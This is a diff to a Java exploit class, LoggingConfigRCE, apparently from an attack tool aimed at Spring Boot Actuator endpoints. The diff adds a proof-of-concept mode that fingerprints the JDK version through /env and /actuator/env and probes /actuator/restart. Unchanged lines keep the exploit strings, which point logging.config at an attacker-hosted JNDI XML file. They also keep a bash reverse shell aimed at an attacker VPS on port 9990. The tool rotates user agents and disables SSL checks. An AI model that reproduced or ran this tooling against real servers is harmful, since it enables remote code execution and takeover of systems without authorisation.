@@ -1,6 +1,7 @@
 package src.main.module;
 
 import src.main.common.UA_Config;
+import src.main.common.VersionComparator;
 import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
@@ -22,6 +23,7 @@ public class LoggingConfigRCE {
     private String address;
     public  String text;
     private String vpsIP;
+    private boolean isPoc;
     private String vpsPort;
     public String expdata1 = "logging.config=http://%s/LoggingConfigJNDI.xml";
     public String expdata2 = "{\"name\":\"logging.config\",\"value\":\"http://%s/LoggingConfigJNDI.xml\"}";
@@ -30,9 +32,10 @@ public class LoggingConfigRCE {
             "</configuration>";
     public String shellpayload = "bash -i >&/dev/tcp/%s/9990 0>&1";
 
-    public LoggingConfigRCE(String address,String vpsIP,String vpsPort){
+    public LoggingConfigRCE(String address,String vpsIP,String vpsPort, boolean isPoc){
         this.address = address;
         this.vpsIP = vpsIP;
+        this.isPoc = isPoc;
         this.vpsPort = vpsPort;
     }
 
@@ -81,7 +84,7 @@ public class LoggingConfigRCE {
                         Scanner sc = new Scanner(System.in);
                         String b64payload = Base64.getEncoder().encodeToString(String.format(shellpayload,vpsIP).getBytes());
                         String exp = String.format(jndipayload,vpsIP,b64payload.replace("+","%2B"));
-                        data = String.format(expdata1,vpsIP);
+                        data = String.format(expdata1,vpsIP+":"+vpsPort);
                         writer.write(exp);
                         sc.close();
                         writer.close();
@@ -236,6 +239,112 @@ public class LoggingConfigRCE {
             e.printStackTrace();
         }
     }
+    public void Result3(ResultCallback callback){
+        String llib = "jdk";
+        String api = "/env";
+        String site = address + api;
+        String ua = "";
+        disableSSLVerification();
+        try {
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            conn.setDoOutput(true);
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            in.close();
+            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)) {
+                String regex = llib + "(\\d+\\.\\d+\\.\\d+_\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = "当前jdk版本为: " + matcher.group(1);
+                    callback.onResult(text);
+                }
+            }
+        }catch (Exception e){
+            text = "检测依赖异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
+    public void Result4(ResultCallback callback){
+        String llib = "jdk";
+        String api = "/actuator/env";
+        String site = address + api;
+        String ua = "";
+        disableSSLVerification();
+        try {
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            conn.setDoOutput(true);
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            in.close();
+            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)) {
+                String regex = llib + "(\\d+\\.\\d+\\.\\d+_\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = "当前jdk版本为: " + matcher.group(1);
+                    callback.onResult(text);
+                    if (
+                            VersionComparator.isVersionAtLeast(matcher.group(1),"11.0.1") ||
+                            VersionComparator.isVersionAtLeast(matcher.group(1),"8u182") ||
+                            VersionComparator.isVersionAtLeast(matcher.group(1),"7u191") ||
+                            VersionComparator.isVersionAtLeast(matcher.group(1),"6u201")
+                    ){
+                        URL obj1 = new URL(address + "/actuator");
+                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                        conn1.setDoOutput(true);
+                        conn1.setRequestProperty("User-Agent", ua);
+                        conn1.setRequestMethod("GET");
+                        int responseCode1 = conn1.getResponseCode();
+                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                        String inputLine1;
+                        StringBuilder response1 = new StringBuilder();
+                        while ((inputLine1 = in1.readLine()) != null) {
+                            response1.append(inputLine1);
+                        }
+                        in1.close();
+                        if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
+                            text = "可能存在漏洞";
+                            callback.onResult(text);
+                        }else {
+                            text = "不存在可利用漏洞";
+                            callback.onResult(text);
+                        }
+                    }else {
+                        text = "不存在可利用漏洞";
+                        callback.onResult(text);
+                    }
+                }
+            }
+        }catch (Exception e){
+            text = "检测依赖异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
     public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
@@ -253,11 +362,19 @@ public class LoggingConfigRCE {
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 text = "当前版本为springboot2";
                 callback.onResult(text);
-                Result2(callback);
+                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
+                    Result4(callback);
+                }else {
+                    Result2(callback);
+                }
             }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                 text = "当前版本为springboot1";
                 callback.onResult("当前版本为springboot1");
-                Result1(callback);
+                if (isPoc){
+                    Result3(callback);
+                }else {
+                    Result1(callback);
+                }
             }else{
                 text = "未识别springboot版本";
                 callback.onResult(text);
